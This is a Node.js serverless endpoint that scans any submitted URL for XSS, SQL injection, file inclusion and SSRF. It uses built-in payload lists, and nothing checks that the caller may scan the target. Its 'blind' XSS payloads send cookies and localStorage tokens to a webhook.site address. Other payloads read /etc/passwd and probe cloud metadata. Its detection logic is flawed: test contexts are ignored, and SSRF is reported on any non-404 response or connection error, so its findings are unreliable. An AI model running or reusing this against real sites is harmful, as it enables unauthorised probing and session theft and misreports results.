const axios = require('axios');
const cheerio = require('cheerio');

module.exports = async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { url, options = {} } = req.body;
    
    if (!url) {
      return res.status(400).json({ error: 'URL is required' });
    }

    // XSS Payload Database
    const xssPayloads = {
      basic: [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "\" onmouseover=\"alert('XSS')\"",
        "'><script>alert('XSS')</script>"
      ],
      advanced: [
        "<iframe src=javascript:alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<details open ontoggle=alert('XSS')>",
        "<select onfocus=alert('XSS')></select>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>"
      ],
      obfuscated: [
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
        "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
        "<script>window['al'+'ert']('XSS')</script>",
        "<img src=x onerror='al'+\"ert\"+'(1)'>",
        "<script>Function('al'+'ert'+'(\"XSS\")')()</script>"
      ],
      dom: [
        "#<img src=x onerror=alert('XSS')>",
        "javascript:alert(document.domain)",
        "data:text/html,<script>alert('XSS')</script>",
        "\" onfocus=\"alert('XSS')\" autofocus=\"\"",
        "<svg/onload=alert('XSS')>"
      ],
      blind: [
        "<script>fetch('https://webhook.site/xxx?data='+btoa(document.cookie))</script>",
        "<img src=x onerror=fetch('https://webhook.site/xxx?data='+encodeURIComponent(window.location))>",
        "<script>new Image().src='https://webhook.site/xxx?data='+document.domain;</script>",
        "<iframe src='https://webhook.site/xxx?data='+btoa(localStorage.getItem('token'))></iframe>"
      ]
    };

    // Test URLs
    const testUrls = [
      url,
      `${url}?q=test`,
      `${url}?search=test`,
      `${url}?id=1`,
      `${url}?page=test`
    ];

    const vulnerabilities = [];
    const payloadsTested = [];
    const securityHeaders = {};
    const formsDetected = [];
    
    // Get page HTML
    const response = await axios.get(url, {
      timeout: 10000,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });
    
    const $ = cheerio.load(response.data);
    
    // Check security headers
    const headers = response.headers;
    securityHeaders['X-Frame-Options'] = headers['x-frame-options'] || 'MISSING';
    securityHeaders['Content-Security-Policy'] = headers['content-security-policy'] || 'MISSING';
    securityHeaders['X-XSS-Protection'] = headers['x-xss-protection'] || 'MISSING';
    securityHeaders['Strict-Transport-Security'] = headers['strict-transport-security'] || 'MISSING';
    
    // Find forms
    $('form').each((i, form) => {
      const formData = {
        id: $(form).attr('id') || `form-${i}`,
        action: $(form).attr('action') || '',
        method: $(form).attr('method') || 'GET',
        inputs: []
      };
      
      $(form).find('input, textarea, select').each((j, input) => {
        formData.inputs.push({
          name: $(input).attr('name') || `input-${j}`,
          type: $(input).attr('type') || 'text',
          value: $(input).attr('value') || ''
        });
      });
      
      formsDetected.push(formData);
    });
    
    // Test for XSS vulnerabilities
    for (const category in xssPayloads) {
      for (const payload of xssPayloads[category]) {
        try {
          // Test in different contexts
          const testCases = [
            { context: 'HTML', test: `<div>${payload}</div>` },
            { context: 'Attribute', test: `<div class="${payload}">test</div>` },
            { context: 'URL', test: `${url}?param=${encodeURIComponent(payload)}` },
            { context: 'Script', test: `<script>var test = "${payload}";</script>` }
          ];
          
          for (const testCase of testCases) {
            const isVulnerable = await testXSS(url, payload, testCase.context);
            
            payloadsTested.push({
              category,
              payload,
              context: testCase.context,
              vulnerable: isVulnerable
            });
            
            if (isVulnerable) {
              vulnerabilities.push({
                type: 'XSS',
                category,
                payload,
                context: testCase.context,
                severity: getSeverityLevel(category),
                location: `${testCase.context} context`,
                exploitation: generateExploit(payload, testCase.context)
              });
            }
          }
        } catch (error) {
          console.error(`Error testing payload: ${error.message}`);
        }
      }
    }
    
    // Check for SQLi patterns
    const sqliVulnerabilities = await testSQLInjection(url);
    vulnerabilities.push(...sqliVulnerabilities);
    
    // Check for LFI/RFI
    const fileInclusion = await testFileInclusion(url);
    vulnerabilities.push(...fileInclusion);
    
    // Check for SSRF
    const ssrf = await testSSRF(url);
    vulnerabilities.push(...ssrf);
    
    const results = {
      url,
      timestamp: new Date().toISOString(),
      vulnerabilities,
      payloadsTested: payloadsTested.slice(0, 50), // Limit response size
      securityHeaders,
      formsDetected,
      stats: {
        totalVulnerabilities: vulnerabilities.length,
        xssCount: vulnerabilities.filter(v => v.type === 'XSS').length,
        sqliCount: vulnerabilities.filter(v => v.type === 'SQLi').length,
        criticalCount: vulnerabilities.filter(v => v.severity === 'critical').length
      }
    };
    
    res.status(200).json(results);
    
  } catch (error) {
    console.error('Scan error:', error);
    res.status(500).json({ 
      error: error.message,
      stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
    });
  }
};

// Helper functions
async function testXSS(url, payload, context) {
  try {
    // Simulate payload injection
    const testUrl = `${url}?test=${encodeURIComponent(payload)}`;
    const response = await axios.get(testUrl, {
      timeout: 5000,
      validateStatus: () => true
    });
    
    // Check if payload is reflected
    const html = response.data;
    const escapedPayload = payload.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const regex = new RegExp(escapedPayload, 'i');
    
    return regex.test(html);
  } catch (error) {
    return false;
  }
}

async function testSQLInjection(url) {
  const sqliPayloads = [
    { payload: "' OR '1'='1", type: 'SQLi', severity: 'high' },
    { payload: "admin'--", type: 'SQLi', severity: 'critical' },
    { payload: "1' UNION SELECT null--", type: 'SQLi', severity: 'critical' },
    { payload: "' AND 1=1--", type: 'SQLi', severity: 'high' },
    { payload: "' AND SLEEP(5)--", type: 'SQLi', severity: 'critical' }
  ];
  
  const vulnerabilities = [];
  
  for (const { payload, type, severity } of sqliPayloads) {
    try {
      const testUrl = `${url}?id=${encodeURIComponent(payload)}`;
      const startTime = Date.now();
      const response = await axios.get(testUrl, {
        timeout: 10000,
        validateStatus: () => true
      });
      const endTime = Date.now();
      
      // Check for time-based SQLi
      if (endTime - startTime > 5000) {
        vulnerabilities.push({
          type,
          payload,
          severity: 'critical',
          location: 'Time-based blind SQLi',
          exploitation: `Time delay detected: ${endTime - startTime}ms`
        });
      }
      
      // Check for error-based SQLi
      if (response.data.includes('SQL') || 
          response.data.includes('syntax') || 
          response.data.includes('database')) {
        vulnerabilities.push({
          type,
          payload,
          severity,
          location: 'Error-based SQLi',
          exploitation: 'Database errors in response'
        });
      }
    } catch (error) {
      // Continue testing
    }
  }
  
  return vulnerabilities;
}

async function testFileInclusion(url) {
  const lfiPayloads = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "/proc/self/environ",
    "file:///etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts"
  ];
  
  const vulnerabilities = [];
  
  for (const payload of lfiPayloads) {
    try {
      const testUrl = `${url}?file=${encodeURIComponent(payload)}`;
      const response = await axios.get(testUrl, {
        timeout: 5000,
        validateStatus: () => true
      });
      
      if (response.data.includes('root:') || 
          response.data.includes('PATH=') ||
          response.data.includes('System32')) {
        vulnerabilities.push({
          type: 'LFI/RFI',
          payload,
          severity: 'critical',
          location: 'File inclusion parameter',
          exploitation: 'Local/Remote file inclusion possible'
        });
      }
    } catch (error) {
      // Continue testing
    }
  }
  
  return vulnerabilities;
}

async function testSSRF(url) {
  const ssrfPayloads = [
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:22",
    "http://127.0.0.1:80",
    "http://[::1]:80",
    "file:///etc/passwd"
  ];
  
  const vulnerabilities = [];
  
  for (const payload of ssrfPayloads) {
    try {
      const testUrl = `${url}?url=${encodeURIComponent(payload)}`;
      const response = await axios.get(testUrl, {
        timeout: 3000,
        validateStatus: () => true
      });
      
      // Check for internal service responses
      if (response.data.includes('AMI id') || 
          response.data.includes('meta-data') ||
          response.status !== 404) {
        vulnerabilities.push({
          type: 'SSRF',
          payload,
          severity: 'critical',
          location: 'URL parameter',
          exploitation: 'Server-side request forgery possible'
        });
      }
    } catch (error) {
      // Timeout or connection error might indicate success
      if (error.code === 'ECONNREFUSED' || error.code === 'ETIMEDOUT') {
        vulnerabilities.push({
          type: 'SSRF',
          payload,
          severity: 'high',
          location: 'URL parameter',
          exploitation: 'Internal service detected'
        });
      }
    }
  }
  
  return vulnerabilities;
}

function getSeverityLevel(category) {
  const severityMap = {
    'blind': 'critical',
    'advanced': 'high',
    'obfuscated': 'high',
    'dom': 'medium',
    'basic': 'low'
  };
  return severityMap[category] || 'medium';
}

function generateExploit(payload, context) {
  return `Inject: ${payload} in ${context} context`;
}
